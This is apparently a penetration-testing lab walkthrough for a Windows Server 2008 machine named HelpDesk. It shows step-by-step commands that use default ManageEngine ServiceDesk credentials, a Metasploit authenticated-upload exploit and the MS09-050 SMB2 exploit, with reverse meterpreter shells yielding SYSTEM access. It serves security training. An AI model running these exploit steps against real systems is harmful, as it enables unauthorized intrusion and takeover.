____

# Exploitation Guide for HelpDesk

## Summary

In this walkthrough, we'll leverage an authenticated file upload exploit and an MS09_050 exploit against the ManageEngine application running on this Windows-based target.

## Enumeration

### Nmap

Let's begin with an `nmap` scan:

```
kali@kali:~$ sudo nmap 192.168.135.43
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 13:40 +03
Nmap scan report for 192.168.135.43
Host is up (0.15s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 10.58 seconds
```

### Detailed Nmap Scan

Next, we'll perform deeper enumeration and grab version information from the more interesting services on ports 139, 445 and 8080.

```
kali@kali:~$ sudo nmap 192.168.135.43 -A -p 139,445,8080
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 13:52 +03
Nmap scan report for 192.168.135.43
Host is up (0.15s latency).

PORT     STATE SERVICE      VERSION
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
8080/tcp open  http         Apache Tomcat/Coyote JSP engine 1.1
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
|_http-server-header: Apache-Coyote/1.1
|_http-title: ManageEngine ServiceDesk Plus
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2012|8|Phone|2008|7|8.1|Vista (92%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_clock-skew: mean: 2h40m00s, deviation: 4h37m07s, median: 0s
|_nbstat: NetBIOS name: HELPDESK, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:bf:4b:ba (VMware)
| smb-os-discovery:
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: HELPDESK
|   NetBIOS computer name: HELPDESK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-01-03T02:52:29-08:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-01-03T10:52:29
|_  start_date: 2020-08-19T00:32:06

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   148.23 ms 192.168.49.1
2   148.53 ms 192.168.135.43

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.10 seconds
```

## Exploitation

### ManageEngine Auth Upload Exploit

At first glance, SMB and HTTP on port 8080 may present possible attack vectors. Let's connect to the web service.

![Alt Text](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_07_image_2_PkPBZU9K.png)

Alt Text

This screenshot indicates we've connected to Service Desk v7.6.0. Let's search for exploits against this version of Service Desk in Metasploit.

```
msf6 > search manageengine 7                                                                           

Matching Modules                                                                                                                                                                                              
================                                                                                       

   #   Name                                                            Disclosure Date  Rank       Check  Description
   -   ----                                                            ---------------  ----       -----  -----------
   0   auxiliary/admin/http/manage_engine_dc_create_admin              2014-12-31       normal     No     ManageEngine Desktop Central Administrator Account Creation
   1   auxiliary/admin/http/manageengine_dir_listing                   2015-01-28       normal     No     ManageEngine Multiple Products Arbitrary Directory Listing
   2   auxiliary/admin/http/manageengine_file_download                 2015-01-28       normal     No     ManageEngine Multiple Products Arbitrary File Download
   3   auxiliary/admin/http/manageengine_pmp_privesc                   2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   4   auxiliary/gather/eventlog_cred_disclosure                       2014-11-05       normal     No     ManageEngine Eventlog Analyzer Managed Hosts Administrator Credential Disclosure
   5   auxiliary/scanner/http/manageengine_deviceexpert_user_creds     2014-08-28       normal     No     ManageEngine DeviceExpert User Credentials
   6   auxiliary/scanner/http/support_center_plus_directory_traversal  2014-01-28       normal     No     ManageEngine Support Center Plus Directory Traversal
   7   exploit/multi/http/eventlog_file_upload                         2014-08-31       excellent  Yes    ManageEngine Eventlog Analyzer Arbitrary File Upload
   8   exploit/multi/http/manage_engine_dc_pmp_sqli                    2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   9   exploit/multi/http/manageengine_auth_upload                     2014-12-15       excellent  Yes    ManageEngine Multiple Products Authenticated File Upload
   10  exploit/multi/http/manageengine_sd_uploader                     2015-08-20       excellent  Yes    ManageEngine ServiceDesk Plus Arbitrary File Upload
   11  exploit/multi/http/opmanager_socialit_file_upload               2014-09-27       excellent  Yes    ManageEngine OpManager and Social IT Arbitrary File Upload
   12  exploit/windows/http/desktopcentral_deserialization             2020-03-05       excellent  Yes    ManageEngine Desktop Central Java Deserialization
   13  exploit/windows/http/desktopcentral_file_upload                 2013-11-11       excellent  Yes    ManageEngine Desktop Central AgentLogUpload Arbitrary File Upload
   14  exploit/windows/http/desktopcentral_statusupdate_upload         2014-08-31       excellent  Yes    ManageEngine Desktop Central StatusUpdate Arbitrary File Upload
   15  exploit/windows/http/manage_engine_opmanager_rce                2015-09-14       manual     Yes    ManageEngine OpManager Remote Code Execution
   16  exploit/windows/http/manageengine_appmanager_exec               2018-03-07       excellent  Yes    ManageEngine Applications Manager Remote Code Execution
   17  exploit/windows/http/manageengine_apps_mngr                     2011-04-08       average    No     ManageEngine Applications Manager Authenticated Code Execution
   18  exploit/windows/http/manageengine_connectionid_write            2015-12-14       excellent  Yes    ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability
   19  exploit/windows/misc/manageengine_eventlog_analyzer_rce         2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution


Interact with a module by name or index. For example info 19, use 19 or use exploit/windows/misc/manageengine_eventlog_analyzer_rce
```

The `exploit/multi/http/manageengine_auth_upload` module seems reasonable, but it requires a valid username/password. Some quick research reveals that the default credentials are administrator/administrator.

![Alt Text](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_07_image_3_BjhcY9mj.png)

Alt Text

Since we have valid credentials for the target application, we can use this exploit.

```
msf6 > use 9
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/manageengine_auth_upload) > options

Module options (exploit/multi/http/manageengine_auth_upload):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   DOMAIN_NAME                      no        Name of the domain to logon to
   IAMAGENTTICKET                   no        Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)
   JSESSIONID                       no        Pre-authenticated JSESSIONID cookie (non-IT360 targets)
   PASSWORD        guest            yes       Password for the specified username
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           8080             yes       The target port (TCP)
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME        guest            yes       The username to login as
   VHOST                            no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.240.2    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/http/manageengine_auth_upload) > set rhosts 192.168.135.43
rhosts => 192.168.135.43
msf6 exploit(multi/http/manageengine_auth_upload) > set username administrator
username => administrator
msf6 exploit(multi/http/manageengine_auth_upload) > set password administrator
password => administrator
msf6 exploit(multi/http/manageengine_auth_upload) > set lhost tun0
lhost => tun0
msf6 exploit(multi/http/manageengine_auth_upload) > run

[*] Started reverse TCP handler on 192.168.49.135:4444
[*] Selecting target...                     
[*] Selected target ServiceDesk Plus/Plus MSP v7.1 >= b7016 - v9.0 < b9031/AssetExplorer v5-v6.1
[*] Uploading bogus file...
[*] Uploading EAR file...  
[+] Upload appears to have been successful
[*] Attempting to launch payload in deployed WAR...
[*] Sending stage (58125 bytes) to 192.168.135.43
[*] Meterpreter session 2 opened (192.168.49.135:4444 -> 192.168.135.43:49205) at 2021-01-03 14:39:34 +0300

meterpreter > shell
Process 1 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\ManageEngine\ServiceDesk\bin>ipconfig /all && hostname && whoami
ipconfig /all && hostname && whoami

Windows IP Configuration

   Host Name . . . . . . . . . . . . : HELPDESK
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-BF-4B-BA
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::e1da:d61f:ad4:13ad%11(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.135.43(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.135.254
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter Local Area Connection*:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 02-00-54-55-4E-01
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
HELPDESK
nt authority\system
```

### MS09_050

Alternatively, since the target machine is running Windows Server 2008 sp1 32-bit, we could use the `ms09_050_smb2_negotiate_func_index1` Metasploit Framework module.

```
msf6 exploit(multi/http/manageengine_auth_upload) > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
options                                                                                                
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description                                                      
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack to complete.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.240.2    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)


msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set rhosts 192.168.135.43
rhosts => 192.168.135.43
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set lhost tun0
lhost => tun0
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run

[*] Started reverse TCP handler on 192.168.49.135:4444
[*] 192.168.135.43:445 - Connecting to the target (192.168.135.43:445)...
[*] 192.168.135.43:445 - Sending the exploit packet (951 bytes)...
[*] 192.168.135.43:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (175174 bytes) to 192.168.135.43
[*] Meterpreter session 3 opened (192.168.49.135:4444 -> 192.168.135.43:49206) at 2021-01-03 16:43:21 +0300

meterpreter > shell
Process 3796 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>ipconfig /all && hostname && whoami
ipconfig /all && hostname && whoami

Windows IP Configuration

   Host Name . . . . . . . . . . . . : HELPDESK
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-BF-4B-BA
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::e1da:d61f:ad4:13ad%11(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.135.43(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.135.254
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter Local Area Connection*:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 02-00-54-55-4E-01
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
HELPDESK
nt authority\system
```

## Escalation

Since we've gained administrator access, privilege escalation is not required.
